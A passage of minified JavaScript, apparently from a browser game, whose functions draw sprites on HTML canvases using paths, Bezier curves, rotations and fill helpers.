                    n.rotate(.8),
                    Ve(n, -15 * e, -14.5 * e, 30 * e, 29 * e, 6 * e),
                    n.restore(),
                    n.fillStyle = t[1],
                    n.fill(),
                    i
            }
            function b1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.save(),
                    r.translate(202.5 * e, 147.5 * e),
                    Ve(r, -96.5 * e, -21.5 * e, 193 * e, 193 * e, 0 * e),
                    r.restore(),
                    he(r, t[0], t[1], 12 * e),
                    r.save(),
                    r.translate(202.5 * e, 190.5 * e),
                    Ve(r, 96.5 * e, -21.5 * e, -193 * e, 43 * e, 0 * e),
                    r.restore(),
                    he(r, t[2], t[1], 12 * e),
                    r.save(),
                    r.save(),
                    r.translate(202.5 * e, 233.5 * e),
                    Ve(r, -96.5 * e, -20.5 * e, 193 * e, 41 * e, 0 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(202.5 * e, 275 * e),
                    Ve(r, 96.5 * e, -21 * e, -193 * e, 42 * e, 0 * e),
                    r.restore(),
                    he(r, t[0], t[1], 12 * e),
                    r.save(),
                    r.translate(201 * e, 212 * e),
                    r.rotate(8.64),
                    Ve(r, -116 * e, -22 * e, 232 * e, 44 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(203.5 * e, 121.5 * e),
                    Ve(r, -115.5 * e, -20.5 * e, 231 * e, 41 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(203.5 * e, 299 * e),
                    Ve(r, -115.5 * e, -20 * e, 231 * e, 40 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(298.5 * e, 210 * e),
                    Ve(r, -20.5 * e, -109 * e, 41 * e, 218 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(108.5 * e, 210 * e),
                    Ve(r, -20.5 * e, -109 * e, 41 * e, 218 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[1], 12 * e),
                    r.save(),
                    r.translate(204 * e, 121.5 * e),
                    Ve(r, -92 * e, -9.5 * e, 184 * e, 19 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[3], 10 * e),
                    r.save(),
                    r.translate(197 * e, 299 * e),
                    Ve(r, 85 * e, -9 * e, -170 * e, 18 * e, 10 * e),
                    r.restore(),
                    he(r, t[3], t[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(94 * e, 317 * e),
                    r.bezierCurveTo(110.5 * e, 299.5 * e, 110.5 * e, 299.5 * e, 127 * e, 282 * e),
                    r.closePath(),
                    he(r, void 0, t[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(279 * e, 142 * e),
                    r.bezierCurveTo(296.5 * e, 125.5 * e, 296.5 * e, 125.5 * e, 314 * e, 109 * e),
                    r.closePath(),
                    he(r, void 0, t[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(93 * e, 106 * e),
                    r.bezierCurveTo(110.5 * e, 124 * e, 110.5 * e, 124 * e, 128 * e, 142 * e),
                    r.closePath(),
                    he(r, void 0, t[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(281 * e, 282 * e),
                    r.bezierCurveTo(296 * e, 297.5 * e, 296 * e, 297.5 * e, 311 * e, 313 * e),
                    r.closePath(),
                    he(r, void 0, t[1], 12 * e),
                    0 == i ? (r.scale(2, 2),
                        r.translate(-7 * e, 55 * e),
                        r.rotate(-.5),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(60 * e, 47 * e),
                        r.bezierCurveTo(81 * e, 46 * e, 85 * e, 47 * e, 83 * e, 63 * e),
                        r.bezierCurveTo(83 * e, 72 * e, 83 * e, 75 * e, 72 * e, 73 * e),
                        r.bezierCurveTo(68 * e, 80 * e, 69 * e, 82 * e, 66 * e, 73 * e),
                        r.bezierCurveTo(62 * e, 81 * e, 61 * e, 82 * e, 59 * e, 73 * e),
                        r.bezierCurveTo(54 * e, 81 * e, 55 * e, 81 * e, 52 * e, 74 * e),
                        r.bezierCurveTo(38 * e, 76 * e, 41 * e, 74 * e, 40 * e, 66 * e),
                        r.bezierCurveTo(38 * e, 45 * e, 39 * e, 49 * e, 59 * e, 47 * e),
                        r.closePath(),
                        he(r, t[4], t[4], 5 * e),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(68 * e, 54 * e),
                        r.bezierCurveTo(75 * e, 54 * e, 77 * e, 62 * e, 71 * e, 64 * e),
                        r.bezierCurveTo(62 * e, 65 * e, 63 * e, 54 * e, 68 * e, 54 * e),
                        r.closePath(),
                        he(r, t[3]),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(50 * e, 55 * e),
                        r.bezierCurveTo(57 * e, 55 * e, 58 * e, 65 * e, 52 * e, 65 * e),
                        r.bezierCurveTo(44 * e, 66 * e, 44 * e, 54 * e, 50 * e, 55 * e),
                        r.closePath(),
                        he(r, t[3])) : 1 == i && (r.scale(.6, .6),
                            r.translate(185 * e, 165 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(108 * e, 56 * e),
                            r.bezierCurveTo(136 * e, 58 * e, 203 * e, 69 * e, 234 * e, 75 * e),
                            r.bezierCurveTo(246 * e, 77 * e, 247 * e, 78 * e, 245 * e, 90 * e),
                            r.bezierCurveTo(238 * e, 143 * e, 228 * e, 197 * e, 214 * e, 259 * e),
                            r.bezierCurveTo(212 * e, 267 * e, 209 * e, 270 * e, 189 * e, 268 * e),
                            r.bezierCurveTo(142 * e, 264 * e, 106 * e, 260 * e, 75 * e, 253 * e),
                            r.bezierCurveTo(60 * e, 250 * e, 64 * e, 250 * e, 66 * e, 221 * e),
                            r.bezierCurveTo(71 * e, 168 * e, 87 * e, 95 * e, 98 * e, 67 * e),
                            r.bezierCurveTo(101 * e, 57 * e, 103 * e, 56 * e, 106 * e, 56 * e),
                            r.closePath(),
                            he(r, t[4], t[4], 20 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(112 * e, 72 * e),
                            r.bezierCurveTo(132 * e, 73 * e, 227 * e, 85 * e, 226 * e, 91 * e),
                            r.bezierCurveTo(231 * e, 89 * e, 217 * e, 196 * e, 200 * e, 250 * e),
                            r.bezierCurveTo(196 * e, 254 * e, 175 * e, 249 * e, 166 * e, 249 * e),
                            r.bezierCurveTo(91 * e, 241 * e, 82 * e, 236 * e, 83 * e, 232 * e),
                            r.bezierCurveTo(90 * e, 144 * e, 108 * e, 71 * e, 111 * e, 72 * e),
                            r.closePath(),
                            he(r, void 0, t[0], 13 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(132 * e, 117 * e),
                            r.bezierCurveTo(171 * e, 86 * e, 191 * e, 101 * e, 188 * e, 134 * e),
                            r.bezierCurveTo(185 * e, 154 * e, 170 * e, 158 * e, 153 * e, 158 * e),
                            r.bezierCurveTo(143 * e, 172 * e, 146 * e, 180 * e, 147 * e, 193 * e),
                            he(r, void 0, t[0], 20 * e),
                            ke(r, 142 * e, 221 * e, 16.1245154965971 * e),
                            he(r, t[0])),
                    n
            }
            function N1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(101 * e, 255 * e),
                    r.bezierCurveTo(113 * e, 243 * e, 179 * e, 210 * e, 219 * e, 196 * e),
                    r.bezierCurveTo(252 * e, 203 * e, 288 * e, 215 * e, 318 * e, 233 * e),
                    r.bezierCurveTo(304 * e, 254 * e, 258 * e, 273 * e, 215 * e, 296 * e),
                    r.bezierCurveTo(161 * e, 287 * e, 119 * e, 270 * e, 102 * e, 257 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(99 * e, 258 * e),
                    r.bezierCurveTo(99 * e, 272.5 * e, 99 * e, 272.5 * e, 99 * e, 287 * e),
                    r.bezierCurveTo(166 * e, 319 * e, 193 * e, 320 * e, 212 * e, 324 * e),
                    r.bezierCurveTo(292 * e, 286 * e, 312 * e, 271 * e, 319 * e, 263 * e),
                    r.bezierCurveTo(320 * e, 249 * e, 320 * e, 241 * e, 318 * e, 234 * e),
                    r.bezierCurveTo(300 * e, 254 * e, 254 * e, 277 * e, 216 * e, 294 * e),
                    r.bezierCurveTo(190 * e, 296 * e, 135 * e, 276 * e, 102 * e, 258 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(212 * e, 323 * e),
                    r.bezierCurveTo(211.5 * e, 310.5 * e, 211.5 * e, 310.5 * e, 211 * e, 298 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(212 * e, 210 * e),
                    r.bezierCurveTo(286 * e, 210 * e, 331 * e, 254 * e, 212 * e, 276 * e),
                    r.bezierCurveTo(108 * e, 276 * e, 112 * e, 222 * e, 213 * e, 208 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 200 * e),
                    r.bezierCurveTo(126 * e, 216 * e, 177 * e, 232 * e, 213 * e, 237 * e),
                    r.bezierCurveTo(266 * e, 218 * e, 288 * e, 209 * e, 318 * e, 190 * e),
                    r.bezierCurveTo(269 * e, 164 * e, 239 * e, 158 * e, 214 * e, 153 * e),
                    r.bezierCurveTo(148 * e, 172 * e, 131 * e, 182 * e, 98 * e, 200 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(97 * e, 204 * e),
                    r.bezierCurveTo(97 * e, 215.5 * e, 97 * e, 215.5 * e, 97 * e, 227 * e),
                    r.bezierCurveTo(148 * e, 250 * e, 179 * e, 256 * e, 212 * e, 262 * e),
                    r.bezierCurveTo(268 * e, 244 * e, 281 * e, 233 * e, 318 * e, 214 * e),
                    r.bezierCurveTo(318 * e, 203 * e, 318 * e, 203 * e, 318 * e, 192 * e),
                    r.bezierCurveTo(250 * e, 225 * e, 236 * e, 231 * e, 214 * e, 239 * e),
                    r.bezierCurveTo(158 * e, 228 * e, 126 * e, 215 * e, 99 * e, 201 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(212 * e, 260 * e),
                    r.bezierCurveTo(212 * e, 251.5 * e, 212 * e, 251.5 * e, 212 * e, 243 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 14 * e),
                    ke(r, 161 * e, 201 * e, 13 * e),
                    he(r, i[5]),
                    ke(r, 216 * e, 205 * e, 8.06225774829855 * e),
                    he(r, i[5]),
                    ke(r, 216 * e, 175 * e, 6.708203932499369 * e),
                    he(r, i[5]),
                    ke(r, 271 * e, 191 * e, 5.0990195135927845 * e),
                    he(r, i[5]),
                    ke(r, 206 * e, 180 * e, 11.180339887498949 * e),
                    he(r, i[5]),
                    n
            }
            function S1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.save(),
                    r.translate(85 * e, 237 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 54.585977194239184 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(178 * e, 238 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 52.53573932334064 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(270 * e, 239 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 53.58058329516393 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(222 * e, 312 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 52.53573932334064 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(317 * e, 159 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 57.63465889766331 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(223.5 * e, 139.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 51.66236541235796 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(132.5 * e, 137.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 52.009614495783374 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(178.5 * e, 58.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 53.16013544000805 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(177.5 * e, 216.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 50 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(84.5 * e, 215.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 54 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(319.5 * e, 138.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 55.08175741568164 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(269.5 * e, 216.0625 * e),
                    r.rotate(1.5707963267948966),
                    A(r, 6, 54.589376255824725 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.save(),
                    r.translate(221.5 * e, 293.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 49.49747468305833 * e, +e),
                    r.restore(),
                    he(r, i[1], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(221.5 * e, 342.0625 * e),
                    r.bezierCurveTo(221.5 * e, 350.5625 * e, 221.5 * e, 350.5625 * e, 221.5 * e, 359.0625 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.5 * e, 270.0625 * e),
                    r.bezierCurveTo(84.5 * e, 277.0625 * e, 84.5 * e, 277.0625 * e, 84.5 * e, 284.0625 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.save(),
                    r.translate(84.5 * e, 215.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(177.5 * e, 215.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(222.5 * e, 294.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(270.5 * e, 216.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(320.5 * e, 134.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(224.5 * e, 138.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(133.5 * e, 137.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    r.save(),
                    r.translate(178.5 * e, 56.0625 * e),
                    r.rotate(.5235987755982988),
                    A(r, 6, 30 * e, 15 * e),
                    r.restore(),
                    he(r, i[3]),
                    n
            }
            function m1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 52 * e,
                    n.height = 65 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(9.833328247070312 * e, 12.078125 * e),
                    r.bezierCurveTo(15.333328247070312 * e, 28.078125 * e, 15.333328247070312 * e, 28.078125 * e, 20.833328247070312 * e, 44.078125 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(7.8333282470703125 * e, 20.078125 * e),
                    r.bezierCurveTo(16.833328247070312 * e, 32.578125 * e, 16.833328247070312 * e, 32.578125 * e, 25.833328247070312 * e, 45.078125 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(23.833328247070312 * e, 26.078125 * e),
                    r.bezierCurveTo(25.833328247070312 * e, 11.078125 * e, 16.833328247070312 * e, 8.078125 * e, 14.833328247070312 * e, 7.078125 * e),
                    r.bezierCurveTo(11.833328247070312 * e, 17.078125 * e, 13.833328247070312 * e, 22.078125 * e, 23.833328247070312 * e, 27.078125 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35.83332824707031 * e, 8.078125 * e),
                    r.bezierCurveTo(34.83332824707031 * e, 27.078125 * e, 28.833328247070312 * e, 27.078125 * e, 23.833328247070312 * e, 28.078125 * e),
                    r.bezierCurveTo(21.833328247070312 * e, 14.078125 * e, 26.833328247070312 * e, 11.078125 * e, 35.83332824707031 * e, 8.078125 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(25.833328247070312 * e, 39.078125 * e),
                    r.bezierCurveTo(20.833328247070312 * e, 29.078125 * e, 14.833328247070312 * e, 27.078125 * e, 5.8333282470703125 * e, 29.078125 * e),
                    r.bezierCurveTo(9.833328247070312 * e, 39.078125 * e, 16.833328247070312 * e, 42.078125 * e, 25.833328247070312 * e, 40.078125 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.83332824707031 * e, 23.078125 * e),
                    r.bezierCurveTo(35.83332824707031 * e, 35.078125 * e, 31.833328247070312 * e, 37.078125 * e, 25.833328247070312 * e, 36.078125 * e),
                    r.bezierCurveTo(25.833328247070312 * e, 24.078125 * e, 33.83332824707031 * e, 21.078125 * e, 42.83332824707031 * e, 23.078125 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(23.833328247070312 * e, 24.078125 * e),
                    r.bezierCurveTo(20.833328247070312 * e, 34.078125 * e, 23.833328247070312 * e, 40.078125 * e, 27.833328247070312 * e, 43.078125 * e),
                    r.bezierCurveTo(37.33332824707031 * e, 28.078125 * e, 37.33332824707031 * e, 28.078125 * e, 46.83332824707031 * e, 13.078125 * e),
                    he(r, void 0, i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(38.83332824707031 * e, 14.078125 * e),
                    r.bezierCurveTo(34.83332824707031 * e, 24.078125 * e, 34.83332824707031 * e, 24.078125 * e, 30.833328247070312 * e, 34.078125 * e),
                    he(r, void 0, i[1], 2 * e),
                    n
            }
            function D1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 170 * e,
                    n.height = 173 * e,
                    r.translate(5 * e, 5 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    r.rotate(.32),
                    A(r, 7, 42.15447781671598 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    r.rotate(.32),
                    A(r, 7, 42.15447781671598 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    r.rotate(.28),
                    A(r, 7, 30.463092423455635 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    r.rotate(.28),
                    A(r, 7, 30.463092423455635 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 4 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    ke(r, 86.25 * e, 84.953125 * e, 18.867962264113206 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    ke(r, 86.25 * e, 84.953125 * e, 18.867962264113206 * e),
                    he(r, i[5], i[6], 4 * e),
                    n
            }
            function v1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 170 * e,
                    n.height = 173 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(85.25 * e, 82.953125 * e),
                    r.bezierCurveTo(98.25 * e, 46.453125 * e, 98.25 * e, 46.453125 * e, 111.25 * e, 9.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111.25 * e, 8.953125 * e),
                    r.bezierCurveTo(117.75 * e, 12.453125 * e, 117.75 * e, 12.453125 * e, 124.25 * e, 15.953125 * e),
                    r.bezierCurveTo(113.75 * e, 39.953125 * e, 113.75 * e, 39.953125 * e, 103.25 * e, 63.953125 * e),
                    r.bezierCurveTo(97.75 * e, 64.953125 * e, 97.75 * e, 64.953125 * e, 92.25 * e, 65.953125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111.25 * e, 8.953125 * e),
                    r.bezierCurveTo(117.75 * e, 12.453125 * e, 117.75 * e, 12.453125 * e, 124.25 * e, 15.953125 * e),
                    r.bezierCurveTo(113.75 * e, 39.953125 * e, 113.75 * e, 39.953125 * e, 103.25 * e, 63.953125 * e),
                    r.bezierCurveTo(97.75 * e, 64.953125 * e, 97.75 * e, 64.953125 * e, 92.25 * e, 65.953125 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(85.25 * e, 82.953125 * e),
                    r.bezierCurveTo(98.25 * e, 46.453125 * e, 98.25 * e, 46.453125 * e, 111.25 * e, 9.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.25 * e, 84.953125 * e),
                    r.bezierCurveTo(123.75 * e, 100.453125 * e, 123.75 * e, 100.453125 * e, 160.25 * e, 115.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(160.25 * e, 114.953125 * e),
                    r.bezierCurveTo(156.25 * e, 122.453125 * e, 156.25 * e, 122.453125 * e, 152.25 * e, 129.953125 * e),
                    r.bezierCurveTo(130.25 * e, 117.953125 * e, 130.25 * e, 117.953125 * e, 108.25 * e, 105.953125 * e),
                    r.bezierCurveTo(107.25 * e, 98.953125 * e, 107.25 * e, 98.953125 * e, 106.25 * e, 91.953125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(160.25 * e, 114.953125 * e),
                    r.bezierCurveTo(156.25 * e, 122.453125 * e, 156.25 * e, 122.453125 * e, 152.25 * e, 129.953125 * e),
                    r.bezierCurveTo(130.25 * e, 117.953125 * e, 130.25 * e, 117.953125 * e, 108.25 * e, 105.953125 * e),
                    r.bezierCurveTo(107.25 * e, 98.953125 * e, 107.25 * e, 98.953125 * e, 106.25 * e, 91.953125 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.25 * e, 84.953125 * e),
                    r.bezierCurveTo(123.75 * e, 100.453125 * e, 123.75 * e, 100.453125 * e, 160.25 * e, 115.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(83.25 * e, 83.953125 * e),
                    r.bezierCurveTo(47.75 * e, 68.453125 * e, 47.75 * e, 68.453125 * e, 12.25 * e, 52.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(13.25 * e, 53.953125 * e),
                    r.bezierCurveTo(17.25 * e, 46.953125 * e, 17.25 * e, 46.953125 * e, 21.25 * e, 39.953125 * e),
                    r.bezierCurveTo(42.75 * e, 52.453125 * e, 42.75 * e, 52.453125 * e, 64.25 * e, 64.953125 * e),
                    r.bezierCurveTo(64.25 * e, 70.953125 * e, 64.25 * e, 70.953125 * e, 64.25 * e, 76.953125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(13.25 * e, 53.953125 * e),
                    r.bezierCurveTo(17.25 * e, 46.953125 * e, 17.25 * e, 46.953125 * e, 21.25 * e, 39.953125 * e),
                    r.bezierCurveTo(42.75 * e, 52.453125 * e, 42.75 * e, 52.453125 * e, 64.25 * e, 64.953125 * e),
                    r.bezierCurveTo(64.25 * e, 70.953125 * e, 64.25 * e, 70.953125 * e, 64.25 * e, 76.953125 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(83.25 * e, 83.953125 * e),
                    r.bezierCurveTo(47.75 * e, 68.453125 * e, 47.75 * e, 68.453125 * e, 12.25 * e, 52.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.25 * e, 86.953125 * e),
                    r.bezierCurveTo(70.25 * e, 123.953125 * e, 70.25 * e, 123.953125 * e, 56.25 * e, 160.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56.25 * e, 159.953125 * e),
                    r.bezierCurveTo(49.25 * e, 155.453125 * e, 49.25 * e, 155.453125 * e, 42.25 * e, 150.953125 * e),
                    r.bezierCurveTo(54.25 * e, 127.953125 * e, 54.25 * e, 127.953125 * e, 66.25 * e, 104.953125 * e),
                    r.bezierCurveTo(71.25 * e, 104.953125 * e, 71.25 * e, 104.953125 * e, 76.25 * e, 104.953125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56.25 * e, 159.953125 * e),
                    r.bezierCurveTo(49.25 * e, 155.453125 * e, 49.25 * e, 155.453125 * e, 42.25 * e, 150.953125 * e),
                    r.bezierCurveTo(54.25 * e, 127.953125 * e, 54.25 * e, 127.953125 * e, 66.25 * e, 104.953125 * e),
                    r.bezierCurveTo(71.25 * e, 104.953125 * e, 71.25 * e, 104.953125 * e, 76.25 * e, 104.953125 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.25 * e, 86.953125 * e),
                    r.bezierCurveTo(70.25 * e, 123.953125 * e, 70.25 * e, 123.953125 * e, 56.25 * e, 160.953125 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4 * e),
                    n
            }
            function M1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 170 * e,
